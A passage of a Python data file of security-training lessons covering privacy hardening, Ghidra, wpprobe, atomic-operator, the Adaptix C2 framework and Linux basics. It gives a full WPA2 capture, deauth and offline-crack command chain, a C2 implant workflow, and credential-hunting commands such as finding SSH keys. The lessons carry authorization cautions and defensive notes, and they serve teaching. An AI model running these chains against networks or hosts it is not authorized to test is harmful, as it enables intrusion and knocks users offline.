            "Hostname / DHCP":   "Your hostname (e.g. 'holdens-laptop') is volunteered to every network you join. Use a generic name and anonymize the DHCP-sent hostname.",
            "OS telemetry":      "Default OS/app telemetry phones home with usage data + identifiers. Disable it, and block the endpoints at the firewall as a backstop.",
            "Encrypted DNS (DoH/DoT)":"Plain DNS exposes every site you visit to the network/ISP. DoH (443) / DoT (853) encrypts it to a resolver YOU choose — pick a trusted one (the resolver still sees the queries).",
            "VPN":               "Hides your IP from the destination and your traffic from the local network — but the VPN provider sees everything. Trust MOVES, it doesn't vanish. Good vs a local/ISP observer; not vs the destination.",
            "Tor":               "Routes through 3 relays so no single hop links you to the destination. The right tool when the destination or a global observer IS the adversary. Use Tor Browser unmodified — customizing it fingerprints you.",
            "Disk encryption (LUKS/FDE)":"Encrypts data at rest so theft/seizure of the device doesn't expose files. The single highest-ROI privacy control against physical loss.",
            "Metadata scrubbing":"Photos carry GPS EXIF; documents carry author + edit history. Strip metadata (mat2, exiftool) BEFORE sharing files.",
        },
        "read": [
            "Privacy is threat-model-relative: name your adversary (ISP? a website? a local sniffer? a nation-state?) — the right controls differ completely, and over-doing it wastes effort or backfires.",
            "Encryption hides CONTENT, not METADATA. TLS/VPN still leak who you talk to, when, and how much. Source anonymity (Tor) is a different problem than confidentiality (TLS).",
            "A VPN is NOT anonymity — it relocates trust to the VPN provider. For 'the destination shouldn't know it's me', that's Tor's job, not a VPN's.",
            "Anonymity loves company: blending into a large crowd (stock Tor Browser, common settings) protects you; bespoke 'privacy' tweaks often make your fingerprint UNIQUE and MORE trackable.",
            "Identifiers persist across reboots and networks (MAC, hardware IDs, account logins, cookies, browser fingerprint) — these correlate your sessions even when each one looks anonymous on its own.",
        ],
        "zoom": {
            "eli5": "Your computer constantly reveals who and where you are and what you're doing. This teaches you to turn off the leaks you don't need and hide the ones you do — so you're much harder to track.",
            "operator": "Strip persistent identifiers (random MAC, generic hostname, no telemetry), encrypt name resolution (DoH/DoT) and transit (VPN for a local/ISP observer, Tor for source anonymity), minimize metadata (scrub EXIF/doc properties, reduce logging), and encrypt at rest (LUKS). Match the toolset to your threat model — a journalist, a pentester, and a privacy-conscious user need different things.",
            "deep": "Identity: per-SSID MAC randomization, hostname/DHCP anonymization, disabling hardware/telemetry phone-home. Resolution: DoH/DoT to a deliberately chosen resolver (encrypt + cut ISP visibility — the resolver still sees queries). Source anonymity: a VPN moves trust to one provider (hides IP from the destination, not from the VPN); Tor distributes trust across 3 relays so no single hop links source to destination. Content/metadata: TLS hides content not endpoints, and traffic analysis still leaks via size/timing. At rest: LUKS FDE + strong passphrase defeats offline theft. Artifacts: scrub EXIF/Office metadata, tighten log retention, clear caches. Anonymity loves company — custom privacy tweaks can paradoxically make you MORE identifiable via fingerprinting.",
        },
        "apply": [
            "Define your threat model in one sentence FIRST ('I don't want the cafe WiFi or the sites I visit to identify or track me'). Every choice below follows from that one line.",
            "Identity: enable per-network MAC randomization (NetworkManager wifi.cloned-mac-address=random), set a generic hostname, anonymize the DHCP hostname, and turn off OS/app telemetry.",
            "Resolution + transit: enable DoH/DoT to a chosen resolver; use a VPN against a local/ISP observer, or Tor (Tor Browser, unmodified) when the destination itself is the adversary.",
            "At rest: enable LUKS full-disk encryption with a strong passphrase — the highest-value control against device theft or seizure.",
            "Artifacts: scrub file metadata before sharing (`mat2 file`, `exiftool -all= file`), tighten log retention, and clear browser/app caches; assume anything logged can be breached or subpoenaed.",
            "Verify: confirm your real IP and DNS don't leak (a DNS-leak + IP check), and sniff your own traffic to see what still leaves in the clear.",
        ],
        "next": [
            "network-silence (the LAN-footprint companion lesson)",
            "tor / torbrowser-launcher (source anonymity done right)",
            "mat2 / exiftool (metadata scrubbing before you share files)",
            "wireguard / openvpn (encrypted transit)",
            "cryptsetup (LUKS full-disk encryption at rest)",
        ],
        "caution": "Privacy hardening on systems you own or administer. Strong anonymity tools (Tor, VPNs) are restricted or monitored in some jurisdictions and on some networks — know your local law and your org's policy. Privacy is not a license for wrongdoing; this is about legitimate confidentiality, anti-tracking, and OpSec.",
        "cia": [
            "CONFIDENTIALITY — the core: keep your identity, lookups, traffic, and stored data away from observers who have no business seeing them.",
            "INTEGRITY — secondary but real: encrypted DNS/transit and refusing rogue routes stop attackers tampering with what you receive (poisoned DNS, injected content).",
            "AVAILABILITY — the cost side: Tor is slow, strict egress/telemetry blocks can break apps, FDE adds a boot step. Privacy is a deliberate tradeoff against convenience — tune it to the threat model.",
        ],
        "try_cmd": "nmcli connection modify <con> wifi.cloned-mac-address random",
    },
    "ghidra": {
        "summary": "NSA's open-source reverse-engineering suite — disassembles AND decompiles binaries into readable C-like pseudocode so you can understand what a compiled program actually does, with no source code",
        "typical": "ghidra   (GUI: new project -> import binary -> auto-analyze -> read the Decompiler)    |    headless: analyzeHeadless <proj_dir> <proj_name> -import <binary> -postScript <Script>",
        "mental_model": (
            "Compilation is a one-way shredder: source code becomes machine code, throwing away names, "
            "comments, and structure. Ghidra runs that backwards as far as the math allows — it disassembles "
            "raw bytes into assembly, then LIFTS that assembly into readable C-like pseudocode. Along the way "
            "it recovers function boundaries, cross-references, strings, and data types, so you can read and "
            "reason about a program you have no source for. You are not getting the original code back — you "
            "are getting a faithful paraphrase that is close enough to follow."
        ),
        "analogy": (
            "A compiled binary is a book translated into a language you don't speak, then shredded, with the "
            "author's name and margin notes burned off. Ghidra reassembles the shreds into sentences "
            "(disassembly) and paraphrases them back into plain language (decompilation). It's not the original "
            "manuscript, but it's close enough to follow the plot — and to find the one paragraph that matters."
        ),
        "flags": {
            "ghidra":            "Launch the GUI (Kali's wrapper for ghidraRun). The normal workflow: create a project, import a binary, auto-analyze, then browse the Decompiler.",
            "analyzeHeadless":   "The no-GUI runner at /usr/share/ghidra/support/ — analyze and script binaries in batch (automation, CI, large sample sets).",
            "<proj_location> <proj_name>":"Headless: the project folder + name to create or open. Or ghidra://server/repo for a shared team project.",
            "-import <dir|file>":"Bring a binary (or a whole directory) into the project and auto-analyze it.",
            "-process [pattern]":"Re-run on files ALREADY imported (instead of -import) — e.g. to apply a new script to the corpus.",
            "-preScript / -postScript <Script>":"Run a Ghidra script BEFORE / AFTER analysis (export decompiled C, dump strings, list xrefs). This is the automation hook.",
            "-scriptPath <paths>":"Where your custom Java/Python (Jython) scripts live.",
            "-recursive":        "With -import on a directory, walk the whole tree of binaries.",
            "-readOnly":         "Analyze without saving changes to the project — throwaway triage.",
            "-deleteProject":    "Discard the project after a one-shot headless run (pairs well with a /tmp project).",
            "-noanalysis":       "Import WITHOUT auto-analysis, when you intend to drive analysis yourself from a script.",
            "-analysisTimeoutPerFile <s>":"Cap per-file analysis time — essential for batch runs so one huge/packed binary can't stall the whole job.",
        },
        "read": [
            "The Decompiler window (C-like pseudocode) is where you live; the Listing (disassembly) is ground truth when the decompile looks wrong or incomplete.",
            "Strings + their cross-references (xrefs) are the fastest way in: find an 'Access denied' string, jump to what references it, and you are standing in the auth check.",
            "Auto-analysis recovers function boundaries, names known library functions via the FID databases (ghidra-data), and builds the call graph — but it GUESSES; verify before you trust it.",
            "Rename variables/functions and add comments as you understand them — RE is iterative, and your annotations ARE the deliverable.",
            "Loading symbols (PDB/DWARF) or applying FID signatures dramatically improves readability — do it before deep reading whenever you can.",
        ],
        "zoom": {
            "eli5": "Programs ship as machine code people can't read. Ghidra turns it back into something close to source code, so you can see how it works — find the password check, the hidden function, or the bug.",
            "operator": "Import the binary, let auto-analysis recover functions/strings/xrefs, then read the Decompiler (C-like) next to the Listing (assembly). Navigate by string -> xref to reach the logic you care about. Use analyzeHeadless to batch-analyze and script exports across many samples.",
            "deep": "Ghidra disassembles via processor-specific SLEIGH specs into P-code (its intermediate representation), then the decompiler runs data-flow and type analysis over P-code to emit C. Analysis is a pipeline: function ID, stack/variable recovery, type propagation, switch recovery. Script it in Java or Python (Jython) against the FlatProgramAPI, automate with Headless, and collaborate via a Ghidra Server. Enrich the output by importing PDB/DWARF symbols or applying FID databases.",
        },
        "steps": [
            {
                "cmd": "/usr/share/ghidra/support/analyzeHeadless /tmp ghtri -import ./suspicious.bin -deleteProject",
                "do": "Create a throwaway project and import + auto-analyze the binary, no GUI.",
                "why_now": "Headless is the fast first pass — recover functions/strings/xrefs before deciding it's worth a GUI deep-dive.",
                "watch_for": "The analysis log: loader/format detected, function count, and any 'unable to' warnings (hints of packing/obfuscation).",
                "means": "You now have an analyzed program — enough to triage whether and where to look closer.",
                "blue": "Static and offline — analyzing in Ghidra touches nothing on a network. You are only READING the sample, not running it.",
            },
            {
                "cmd": "analyzeHeadless /tmp ghtri -process suspicious.bin -postScript ExportToC.java",
                "do": "Run a script after analysis to export the decompiled C (or strings/xrefs) to a file.",
                "why_now": "Scripting turns one-off RE into repeatable, diffable output — vital for triaging many samples or wiring it into CI.",
                "watch_for": "The exported artifact (decompiled functions, string table). Grep it for crypto constants, URLs, and command strings.",
                "means": "A text artifact you can diff across malware variants or feed to the next analysis stage.",
                "blue": "The core blue-team move: turn an adversary binary into readable code so you can write detections/signatures from its real behavior.",
            },
            {
                "cmd": "ghidra   (open the project, go to the functions triage flagged)",
                "do": "Switch to the GUI only for the functions triage flagged — read the Decompiler, rename, comment, chase xrefs.",
                "why_now": "GUI time is expensive; spend it only where headless said the logic of interest lives.",
                "watch_for": "The routine that handles the suspicious string / network call — usually the payload, the auth check, or the secret.",
                "means": "Understanding of the exact routine: the algorithm, the key, the vulnerability, or the C2 behavior.",
                "blue": "From here you author the YARA rule, the detection, or the patch. Reading the binary is how the defense gets written.",
            },
        ],
        "next": [
            "gdb / gef (dynamic — confirm at runtime what the static decompile implies)",
            "radare2 / cutter (alternative RE suite + fast triage)",
            "strings / binwalk (quick first-pass triage before a full project)",
            "yara (turn what you learned into a reusable detection signature)",
        ],
        "caution": "Reverse engineering can be limited by software licenses/EULAs and local law (anti-circumvention rules). RE your OWN binaries, CTF/authorized targets, or malware in an ISOLATED lab. Ghidra itself is static and safe, but treat the samples around it as live — analyze real malware only in a disposable, network-isolated VM.",
        "cia": [
            "DEFENSIVE / BLUE — the dominant use: malware analysis and vulnerability research. Reading the adversary's binary is exactly how YARA rules, detections, and patches get written.",
            "CONFIDENTIALITY — RE recovers the logic and secrets an author meant to keep opaque (keys, license checks, protocols, C2 details).",
            "INTEGRITY — understanding the code is the precursor to modifying it: patching a vuln, neutralizing an implant, or (offensively) defeating a check.",
        ],
        "try_cmd": "ghidra",
    },
    "wpa-handshake": {
        "summary": "How WPA2-PSK proves both sides know the WiFi password without ever sending it — the 4-way handshake — and why recording it lets an attacker crack the password offline",
        "typical": "airmon-ng start wlan0  ->  airodump-ng (find target)  ->  airodump-ng -c CH --bssid BSSID -w cap  ->  aireplay-ng --deauth  ->  aircrack-ng -w wordlist cap.cap",
        "mental_model": (
            "WPA2-PSK never sends your WiFi password over the air. Instead the access point (AP) and "
            "your device each PROVE they know it by trading random numbers and a fingerprint computed "
            "from (those numbers + the password). That four-message exchange is the 4-way handshake. "
            "The catch: every part of the handshake travels in the clear EXCEPT the password itself. So "
            "if you record the handshake you can sit offline and guess passwords until one produces the "
            "same fingerprint. You are not 'cracking WiFi' live — you are checking guesses against a math "
            "problem you copied down off the air."
        ),
        "analogy": (
            "Two people prove they share a secret word without saying it: each shouts a random number, "
            "then both whisper a checksum made from (their two numbers + the secret word). Matching "
            "checksums means both knew the word. An eavesdropper hears the random numbers and the "
            "checksum but never the word — so all they can do is go home and try words until one makes "
            "the same checksum. The deauth attack just forces the two people to redo the exchange now, "
            "while you are listening."
        ),
        "flags": {
            "airmon-ng start":  "Put the WiFi card into MONITOR mode (wlan0 -> wlan0mon) so it hears EVERY frame in the air, not just traffic addressed to you.",
            "airodump-ng (bare)":"No filter = hop all channels and list APs (BSSID, CH, ENC, ESSID) plus the clients on each. This is the recon survey.",
            "-c CH":            "Lock the capture to the target's channel. Cards hop channels by default; the handshake is a 4-frame burst, so you must be parked to catch it.",
            "--bssid BSSID":    "Filter to the one target AP's radio MAC so the capture isn't buried under the whole neighborhood.",
            "-w cap":           "Write frames to disk (cap-01.cap). The handshake must be ON DISK before you can crack it.",
            "--deauth N -a BSSID -c CLIENT":"aireplay: send N forged 'disconnect' frames to CLIENT spoofed as the AP, so the client reconnects and re-runs the handshake while you record.",
            "aircrack-ng -w LIST":"Offline crack: for each candidate password derive the keys and check it against the captured fingerprint (MIC). Never touches the target.",
        },
        "read": [
            "A crackable target in airodump needs three things: a BSSID, a channel (CH), and at least one STATION (connected client). No client -> nothing to deauth (see the PMKID method instead).",
            "Success signal: 'WPA handshake: <BSSID>' appears top-right in airodump once enough of the four frames are captured.",
            "The handshake frames are EAPOL messages M1-M4. In Wireshark, the filter 'eapol' shows you exactly the four packets that matter.",
            "A captured handshake is NOT the password — it is the math needed to TEST passwords. aircrack only wins if the real password is in your wordlist.",
            "If the wordlist runs out with no hit, that is itself a finding: the passphrase resisted the guess space — evidence the WiFi password is strong.",
        ],
        "zoom": {
            "eli5": "The router and your phone prove they both know the WiFi password by trading random numbers and a secret-recipe checksum — never the password itself. Record that trade and you can guess passwords offline until one matches the checksum.",
            "operator": "Capture the 4-way handshake (EAPOL M1-M4) by parking on the AP's channel and recording; optionally deauth a client to force a fast reconnect. The .cap then feeds an offline dictionary or brute attack in aircrack-ng (or hashcat mode 22000). Cracking needs zero further contact with the target.",
            "deep": "PSK + SSID --PBKDF2(4096 iter, SSID as salt)--> PMK (256-bit). M1 AP->STA: ANonce. STA now has ANonce+SNonce+both MACs+PMK and derives PTK = PRF(PMK, ANonce | SNonce | AP_MAC | STA_MAC). M2 STA->AP: SNonce + MIC. M3 AP->STA: MIC + encrypted GTK. M4: ACK. Offline crack per guess g: PMK' = PBKDF2(g, SSID); PTK' = PRF(...); MIC' = HMAC(PTK', eapol_frame); if MIC' == captured MIC then g is the password. PMKID variant: some APs put PMKID = HMAC-SHA1(PMK, 'PMK Name' | AP_MAC | STA_MAC) in M1, enabling a clientless crack with no deauth.",
        },
        "steps": [
            {
                "cmd": "airmon-ng start wlan0",
                "do": "Put the Alfa card into monitor mode (wlan0 -> wlan0mon).",
                "why_now": "Managed mode only hears traffic addressed to you. You cannot study the airspace until the card listens to every frame.",
                "watch_for": "Interface renamed to wlan0mon and 'monitor mode enabled'. If airmon-ng warns about interfering processes, run 'airmon-ng check kill' first.",
                "means": "The card can now see frames from every AP and client in range.",
                "blue": "Purely passive — nothing hits the wire to detect. Lesson: recon leaves no trace, which is exactly why defenders cannot rely on catching this stage.",
            },
            {
                "cmd": "airodump-ng wlan0mon",
                "do": "Survey the air: list APs (BSSID, CH, ENC, ESSID) and the STATIONs connected to each.",
                "why_now": "You cannot target what you cannot see. You need the AP's BSSID, its channel, and ideally a connected client.",
                "watch_for": "Your target's BSSID and CH, a STATION row beneath it, and WPA2 in the ENC column.",
                "means": "You now hold the three prerequisites for a capture: BSSID, channel, and a victim client.",
                "blue": "Still passive and undetectable. A WIDS cannot see a silent listener — this is why rogue-listener detection is so hard and defense focuses elsewhere.",
            },
            {
                "cmd": "airodump-ng -c CH --bssid BSSID -w cap wlan0mon",
                "do": "Park on the target's channel and record all of its frames to cap-01.cap.",
                "why_now": "The handshake is a 4-frame burst. You must already be recording, on the correct channel, BEFORE it happens.",
                "watch_for": "The 'WPA handshake:' field top-right stays blank until caught. Leave this window running; it is your recorder.",
                "means": "Any handshake that occurs now lands on disk with the nonces and MIC you need to crack.",
                "blue": "Channel-locked listening is still passive. The loud, detectable part comes next.",
            },
            {
                "cmd": "aireplay-ng --deauth 3 -a BSSID -c CLIENT wlan0mon",
                "do": "Send a few forged 'deauthenticate' frames so the client drops and immediately reconnects.",
                "why_now": "Waiting for a natural reconnect is slow. This WORKS because WPA2 management frames are unauthenticated — the client cannot tell your forged deauth from the real AP's.",
                "watch_for": "The STATION disappears then reappears, and the capture window flips to 'WPA handshake: <BSSID>'. Send the MINIMUM (3) — a flood is noisy and denies service to real users.",
                "means": "The forced reconnect re-runs the 4-way handshake, which your recorder just captured.",
                "blue": "THE LOUD STEP. A WIDS sees a deauth flood; 802.11w / PMF makes forged management frames get silently dropped, defeating this entirely. This is exactly where you teach the WPA3 upgrade.",
            },
            {
                "cmd": "aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap",
                "do": "For each candidate password: derive PMK -> PTK, compute the MIC, and compare it to the captured MIC.",
                "why_now": "You have everything except the password, and this needs ZERO contact with the target — it is fully offline.",
                "watch_for": "'KEY FOUND! [ password ]' on success, or the list exhausts. For GPU speed, convert the cap to mode 22000 and run hashcat.",
                "means": "A hit hands you the PSK. No hit means the password was not in your list — you have proven it was strong.",
                "blue": "Undetectable (offline). Defense lives entirely upstream: passphrase entropy (length + randomness) and WPA3-SAE, which makes offline guessing infeasible. A crack you CANNOT finish is the blue team winning.",
            },
        ],
        "next": [
            "hashcat (mode 22000 — GPU-speed cracking of this same capture)",
            "wpa-pmkid (clientless capture when no client is connected to deauth)",
            "wifite (automates this whole chain end to end)",
            "wpa3-sae / 802.11w PMF (the defenses that close deauth + offline cracking)",
        ],
        "caution": "Your OWN network, or one you have explicit written permission to test, in a controlled lab. Deauth frames knock REAL devices offline (an availability attack), and capturing handshakes on networks you do not own is illegal in most places. Send the fewest deauths needed and never run this against production WiFi without sign-off.",
        "cia": [
            "CONFIDENTIALITY — primary. The chain targets the one secret (the PSK) protecting every device on the network; crack it and you can decrypt traffic and join.",
            "AVAILABILITY — the deauth step is a live availability attack: forged frames knock clients offline. That is the noisy, detectable, legally serious part.",
            "INTEGRITY — downstream. With the PSK you are a trusted insider on the LAN and can tamper with traffic (MITM, DNS spoofing) from the inside.",
        ],
        "try_cmd": "airmon-ng start wlan0",
    },
    "wpprobe": {
        "summary": "Stealthy WordPress plugin scanner — fingerprints installed plugins and flags known CVEs from the Wordfence database",
        "typical": "wpprobe update-db && wpprobe scan -u https://target.tld -o results.json",
        "flags": {
            "update-db":        "FIRST run, always. Pulls the Wordfence vuln database locally — without it you find plugins but know no CVEs.",
            "scan -u URL":      "Scan a single WordPress site for installed plugins + known vulns.",
            "-f FILE":          "Scan many sites, one URL per line — for sweeping a scope, not a single target.",
            "-m MODE":          "stealthy (default, quiet) / bruteforce (probes a big plugin wordlist, loud) / hybrid. Start stealthy.",
            "-p LIST":          "Custom plugin wordlist for bruteforce mode.",
            "-o FILE":          "Save results as csv or json (extension decides) — keep the evidence for your report.",
            "-t / --rate-limit":"Concurrency (default 10) and req/s cap (default 50). Lower both to stay quiet or spare a fragile site.",
            "--proxy URL":      "Route through Burp (http://127.0.0.1:8080) to inspect and replay.",
            "--no-check-version":"Skip version checks (faster) — but you lose the 'is this version actually vulnerable' signal.",
        },
        "read": [
            "It detects plugins by public fingerprints (readme.txt, asset paths) — no login needed, which is what makes it stealthy.",
            "A plugin match is NOT a vuln by itself; wpprobe cross-references the installed version against Wordfence CVE data.",
            "stealthy only confirms plugins it can passively see; bruteforce guesses from a wordlist and is far noisier (WAF-flaggable).",
            "The 50 r/s default exists to avoid flooding — on production WordPress, drop it.",
            "Findings map to specific CVEs — pull the matching PoC, don't assume exploitability.",
        ],
        "next": ["searchsploit (PoCs for the flagged CVEs)", "nuclei (template-confirm the specific CVE)", "wpscan (second-opinion scanner)", "burp (manual confirmation)"],
        "caution": "Authorized targets only — plugin enumeration, and especially bruteforce mode, is active scanning of someone's site. bruteforce/hybrid can generate heavy traffic; on production WordPress that is an availability risk, so prefer stealthy + a low rate-limit unless you have sign-off to be loud.",
        "cia": [
            "CONFIDENTIALITY — primary. It enumerates the plugin attack surface and known weaknesses, the recon that precedes a breach.",
            "INTEGRITY — downstream. The CVEs it surfaces (plugin RCE, auth-bypass, SQLi) are the paths to modifying the site.",
            "AVAILABILITY — incidental. bruteforce request volume can degrade a fragile site; the rate-limit is the guardrail.",
        ],
    },
    "atomic-operator": {
        "summary": "Runs Atomic Red Team tests — small ATT&CK-mapped attack simulations that VALIDATE whether your detections actually fire (purple team)",
        "typical": "atomic-operator get_atomics && atomic-operator run --technique_ids T1059.001 --check_prereqs",
        "flags": {
            "get_atomics":      "Downloads Red Canary's atomic-red-team repo locally (the test library). Run once, first.",
            "run":              "The main verb — executes the atomic test(s) for the technique(s) you name on the local host.",
            "--technique_ids":  "Which ATT&CK technique(s) to simulate, e.g. T1059.001 (PowerShell), T1003 (cred dumping) — what you're testing detection for.",
            "--atomics_path":   "Where the downloaded atomics live (the path get_atomics wrote to).",
            "--check_prereqs / --get_prereqs":"Check whether a test's prerequisites are met / fetch them — so the test actually runs instead of silently no-op'ing.",
            "--cleanup":        "Run each test's cleanup afterward to undo changes (files, accounts, reg keys) — leave the box as you found it.",
            "search":           "Find techniques/tests in the library by keyword before you run them.",
        },
        "read": [
            "This is a DETECTION-VALIDATION tool, not exploitation — you run a known technique on a host you control, then check the EDR/SIEM caught it.",
            "Every test maps to a MITRE ATT&CK technique ID — the point is to walk the matrix and find your blind spots.",
            "--check_prereqs matters: many tests need a tool/file present first; without it the test 'passes' having done nothing.",
            "ALWAYS clean up — atomics intentionally create artifacts (files, users, reg keys) you must remove.",
            "Run it where your detections live (a monitored lab host / your own fleet), or the exercise tells you nothing.",
        ],
        "next": ["the SIEM/EDR console (did the alert fire? — the actual deliverable)", "ATT&CK Navigator (track which techniques you've validated)", "caldera (chain atomics into full adversary emulation)", "sigma (write the detection the test exposed as missing)"],
        "caution": "Run only on hosts you own or are authorized to test — atomics execute REAL attack behaviors (spawn shells, touch credentials, modify the registry). Never point it at production without change-control: a test can trip other defenses or leave artifacts if cleanup is skipped.",
        "cia": [
            "DEFENSIVE / PURPLE — the odd one out: this tool exists to IMPROVE the blue team. The 'attack' is a controlled probe of your own visibility.",
            "INTEGRITY — tests deliberately modify the host (files, users, reg keys); cleanup restores it.",
            "AVAILABILITY — some destructive techniques (service/boot tampering) can disrupt the test host; scope and clean up accordingly.",
        ],
    },
    "adaptix-c2": {
        "summary": "Modern open-source command-and-control framework — teamserver + multi-operator GUI client, extensible agents/listeners (a free Cobalt Strike-class C2)",
        "typical": "cd /usr/share/adaptixc2 && ./adaptixserver -profile profile.yaml   # then connect with: adaptixclient",
        "flags": {
            "adaptixserver":    "The teamserver — the brain. Holds sessions, tasks agents, brokers between operators. Started with a profile.",
            "profile.yaml":     "Server config: listen port, operator credentials, endpoint/SSL settings. Edit BEFORE first launch.",
            "adaptixclient":    "The Qt operator GUI — connects to the teamserver so multiple operators share one engagement.",
            "ssl_gen.sh + server.rsa.crt/key":"Generates/holds the TLS material for the client-server channel — encrypted operator comms.",
            "extenders":        "Extension modules — how Adaptix adds agents (beacon-like implants), listeners, and BOF support. The core is small; capability lives here.",
            "listener":         "The server-side endpoint an implant calls back to (HTTP/S, SMB, TCP). Define it in the client before generating an agent.",
            "agent / beacon":   "The implant on the target that polls the listener for tasks — sleep/jitter control stealth vs responsiveness.",
        },
        "read": [
            "Mental model: adaptixserver = the hub; adaptixclient = your console; extenders = the plugins that give it implants/listeners/BOFs.",
            "Workflow: edit profile.yaml -> start server -> connect client -> create a listener -> generate an agent -> run it on the (authorized) target -> task it.",
            "It's intentionally minimal at the core — almost everything operational comes from extenders, so check which are loaded.",
            "Sleep/jitter on the agent is your main OpSec dial: longer sleeps = stealthier beaconing, slower interaction.",
            "All operator-server traffic rides the cert from ssl_gen.sh — regenerate it per engagement; the shipped cert is a fingerprint.",
        ],
        "next": ["sliver (compare — another modern open-source C2)", "havoc (compare — similar GUI C2)", "a redirector (front the C2 behind a CDN/redirector for OpSec)", "mythic (compare — containerized multi-agent C2)"],
        "caution": "A C2 framework is post-exploitation tooling — running an implant on any system you don't own or aren't explicitly authorized (written scope) to test is a serious crime. Even in a lab, keep the teamserver off the public internet unless the engagement requires it, and regenerate certs/creds per engagement.",
        "cia": [
            "CONFIDENTIALITY — primary. C2 is the channel for tasking implants to collect and exfiltrate data from compromised hosts.",
            "INTEGRITY — direct. Operators run commands, drop tools, and modify the target through the agent.",
            "AVAILABILITY — situational. Post-ex actions (ransomware emulation, service kills) can be staged through C2, though that's engagement-specific.",
        ],
    },

    # ══════════════════════════════════════════════════════════════
    # FUNDAMENTALS — how the machine actually works
    # The on-ramp every tool lesson assumes. Concept lessons (no single
    # binary), so they carry CIA placement + 🛠️ SEE IT YOURSELF hands-on
    # commands (via the 'apply' field) the student runs on their own box
    # to OBSERVE the concept — with the security angle made explicit.
    # ══════════════════════════════════════════════════════════════

    "linux-basics": {
        "summary": "Why Linux runs security — and the map of where everything lives on the system",
        "typical": "ls -la /     # look at the top-level filesystem map",
        "flags": {
            "Why Linux":     "Open source + full control over processes/networking. nmap, burp, metasploit, gdb are all Linux-first.",
            "/ (root)":      "The top of everything. Linux has ONE tree, not C:/D: drives — every disk mounts somewhere under /.",
            "/etc":          "System config + the user/password files. Where you look first to understand a box.",
            "/home, /root":  "User home dirs; /root is the superuser's home. Loot and dotfiles live here.",
            "/var, /tmp":    "/var/log = the logs that record you; /tmp = world-writable scratch space (sticky bit).",
            "/bin, /sbin":   "The binaries — the actual commands. /usr/bin too. Where tools and LOLBins live.",
            "/proc, /dev":   "Virtual filesystems: /proc = live kernel + process data; /dev = device files.",
        },
        "read": [
            "Everything in Linux is a file — devices, processes, sockets. That's why /proc and /dev are so powerful.",
            "You can't understand a target until you know this map — configs in /etc, logs in /var/log, loot in /home.",
            "There are no drive letters. One root (/), and storage 'mounts' into the tree at a path.",
            "The same five commands (ls, cd, cat, grep, find) get you 80% of exploration.",
            "Knowing WHERE things live is half of post-exploitation — you navigate fast because you know the map.",
        ],
        "next": ["the-shell", "filesystems", "permissions", "processes"],
        "caution": "Exploring your own box is free and safe. The same commands on a client system are only OK in scope.",
        "cia": [
            "Linux IS the enforcement layer for all three pillars — file permissions (C/I), process isolation (I), and network controls (A) are all kernel features you're about to learn.",
            "Understanding the OS is what lets you reason about HOW a finding breaks the triad, not just THAT it does.",
        ],
        "apply": [
            "Run `ls -la /` and read the top-level dirs out loud — name what each is for. That map is your mental model for every box you ever touch.",
            "`cat /etc/os-release` to identify the exact distro+version — the first thing you'd note on a target (it tells you which exploits apply).",
            "`cat /etc/passwd` — every account on the system, world-readable. Note which have real shells (/bin/bash) vs nologin. This is recon you can do on your own box right now.",
            "`ls -la /var/log/` — these are the files that record what you do. Knowing they exist is step one of understanding detection.",
            "`which nmap` then `ls -la $(which nmap)` — find a tool's actual binary and see its permissions. Everything is a file with an owner and rights.",
        ],
        "try_cmd": "ls -la /",
    },

    "the-shell": {
        "summary": "The command line itself — commands, pipes, redirection: how you chain power together",
        "typical": "cat /etc/passwd | grep -v nologin | cut -d: -f1",
        "flags": {
            "command args":  "Every line is: a binary, then flags/arguments. `ls -la /home` = run ls, options -la, on /home.",
            "| (pipe)":      "Send one command's OUTPUT into the next command's INPUT. The core of Unix power.",
            "> and >>":      "> writes output to a file (overwrites); >> appends. `nmap ... > scan.txt`.",
            "2> and &>":     "2> redirects ERRORS (stderr); &> both. `find / ... 2>/dev/null` hides permission-denied noise.",
            "* ? [ ]":       "Wildcards (globbing): * = any chars, ? = one char. `ls *.txt`. The SHELL expands these, not the command.",
            "$(...)":        "Command substitution — run a command and use its output inline: `cat $(which python3)`.",
            "&& and ;":      "&& = run next only if this succeeds; ; = run next regardless. Chaining steps.",
        },
        "read": [
            "A pipeline is read left-to-right: each | hands the previous output to the next tool. That's how you filter scan output.",
            "`2>/dev/null` is everywhere in pentest commands — it throws away the 'Permission denied' spam so you see real results.",
            "Wildcards are expanded by the shell BEFORE the command runs — that's why quoting matters in payloads.",
            "Redirection (>) is how you save tool output for your report. Get in the habit early.",
            "The pipe is why Unix tools are small: each does one thing, and you compose them. subfinder | httpx | nmap is this idea.",
        ],
        "next": ["filesystems", "linux-basics", "grep / find usage", "nmap"],
        "caution": "A stray `>` overwrites files silently. Double-check redirection targets before hitting Enter.",
        "cia": [
            "The shell is neutral — but it's the INTERFACE through which every confidentiality (read), integrity (write/modify), and availability (kill/start) action is performed.",
            "Redirection and pipes are how attackers move and stage data — understanding them is understanding exfiltration mechanics.",
        ],
        "apply": [
            "Build a pipeline on your own box: `cat /etc/passwd | grep -v nologin | cut -d: -f1` — every real-shell username, extracted. You just did credential recon with three piped tools.",
            "See redirection work: `ls -la / > /tmp/root.txt` then `cat /tmp/root.txt`. You captured output to a file — exactly how you'd save scan results.",
            "Watch stderr filtering: run `find / -name id_rsa` (lots of 'Permission denied'), then `find / -name id_rsa 2>/dev/null` — clean. That `2>/dev/null` is in nearly every find-based loot hunt.",
            "Try command substitution: `file $(which bash)` — finds bash's path AND inspects it in one line.",
            "Glob safely: `ls /etc/*.conf` lists config files. The shell expanded `*` to every match before ls ran.",
        ],
        "try_cmd": "cat /etc/passwd | grep -v nologin | cut -d: -f1",
    },

    "filesystems": {
        "summary": "How data is actually stored — inodes, links, paths, and the /proc window into the kernel",
        "typical": "ls -lai /etc/passwd     # see the inode number + metadata",
        "flags": {
            "inode":         "The real file. Metadata (owner, perms, timestamps) + pointers to data blocks. The NAME is just a label pointing at an inode.",
            "absolute path": "Starts from root: /etc/passwd. Unambiguous from anywhere.",
            "relative path": ". = here, .. = parent. `../../../etc/passwd` — the basis of path-traversal attacks.",
            "hard link":     "A second NAME for the same inode. Delete the original name, data survives via the link.",
            "symlink (ln -s)":"A pointer FILE that holds another path. Can dangle (point at nothing) or cross filesystems.",
            "mount":         "Attaching a disk/share into the tree at a path. `mount`, /etc/fstab. Storage isn't a drive letter — it's a location.",
            "/proc/[pid]/":  "A live window into a running process: cmdline, environ, fd/, maps. Not real files — kernel data as files.",
        },
        "read": [
            "A filename is NOT the file — it's a directory entry pointing at an inode. That's why hard links and 'deleted but still open' files work.",
